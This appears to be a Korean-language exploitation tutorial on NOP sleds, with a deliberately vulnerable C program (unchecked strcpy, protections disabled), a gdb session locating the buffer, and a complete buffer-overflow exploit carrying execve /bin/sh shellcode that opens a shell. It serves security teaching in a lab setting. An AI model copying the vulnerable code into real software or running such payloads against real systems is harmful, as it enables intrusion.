# NOP
* NOP Sled : 셸코드의 주소를 정확히 알아내기 힘들 경우 큰 메모리를 확보하여 셸코드 주소의 오차범위를 크게 만들 때 사용한다. x86 아키텍처의 NOP 명령어 바이트코드는 \X90이다.

* 예시
```C
//example1.c
// gcc -o example1 example1.c -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -m32
#include <stdio.h>
int vuln(char *src) {
  
  char buf[32] = {};
  
  strcpy(buf, src);
  return 0;
}
int main(int argc, char *argv[], char *environ[]) {
  if (argc < 2){
    exit(-1);
  }
  vuln(argv[1]);
  return 0;
}
```
10000바이트의 NOP Sled가 포함된 셸코드를 example1의 argv[1]에 넣은 후 gdb를 이용해 NOP Sled의 중간 지점의 주소를 찾아보도록 하자.
```
$ gdb -q ./example1
Reading symbols from ./example1...(no debugging symbols found)...done.
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804843b <+0>:	push   ebp
   0x0804843c <+1>:	mov    ebp,esp
   0x0804843e <+3>:	sub    esp,0x20
   0x08048441 <+6>:	mov    ecx,0x0
   0x08048446 <+11>:	mov    eax,0x20
   0x0804844b <+16>:	and    eax,0xfffffffc
   0x0804844e <+19>:	mov    edx,eax
   0x08048450 <+21>:	mov    eax,0x0
   0x08048455 <+26>:	mov    DWORD PTR [ebp+eax*1-0x20],ecx
   0x08048459 <+30>:	add    eax,0x4
   0x0804845c <+33>:	cmp    eax,edx
   0x0804845e <+35>:	jb     0x8048455 <vuln+26>
   0x08048460 <+37>:	push   DWORD PTR [ebp+0x8]
   0x08048463 <+40>:	lea    eax,[ebp-0x20]
   0x08048466 <+43>:	push   eax
   0x08048467 <+44>:	call   0x8048300 <strcpy@plt>
   0x0804846c <+49>:	add    esp,0x8
   0x0804846f <+52>:	mov    eax,0x0
   0x08048474 <+57>:	leave  
   0x08048475 <+58>:	ret    
End of assembler dump.
(gdb) b *0x08048467
Breakpoint 1 at 0x8048467
(gdb) r python -c 'print "A"*36+"RETN"+"\x90"*100000+"SHELLCODE"'
Starting program: ~/example1 python -c 'print "A"*36+"RETN"+"\x90"*100000+"SHELLCODE"'
Breakpoint 1, 0x08048467 in vuln ()
(gdb) x/2wx $esp
0xfffe4e54:	0xfffe4e5c	0xfffe50a9
(gdb) x/40wx 0xfffe50a9
0xfffe50a9:	0x41414141	0x41414141	0x41414141	0x41414141
0xfffe50b9:	0x41414141	0x41414141	0x41414141	0x41414141
0xfffe50c9:	0x41414141	0x4e544552	0x90909090	0x90909090
0xfffe50d9:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffe50e9:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffe50f9:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffe5109:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffe5119:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffe5129:	0x90909090	0x90909090	0x90909090	0x90909090
0xfffe5139:	0x90909090	0x90909090	0x90909090	0x90909090
(gdb) 
```
vuln 함수에서 strcpy 함수를 호출하는 시점에 breakpoint를 설정해 복사 버퍼인 argv[1]의 주소인 0xfffe50a9를 알아내었다.
다음으로 NOP Sled 중간 지점의 주소(argv[1]+50000)를 계산해 보자.
```
(gdb) p/x 0xfffe50a9 + 50000
$3 = 0xffff13f9
(gdb) 
```
NOP Sled 중간 지점 주소는 0xffff13f9이다. 이 주소를 이용한 새로운 공격 코드는 아래와 같이 구성할 수 있다.
```
"A" * 36 + 0xffff13f9 + "\x90" * 100000 + shellcode
```
만들어진 공격 코드를 이용해 익스플로잇을 시도해 보자.
```
$ ./example1 python -c 'print "A"*36 + "\xf9\x13\xff\xff" + "\x90"*100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"'
$ id
uid=1001(theori) gid=1001(theori) groups=1001(theori)
$ 
```
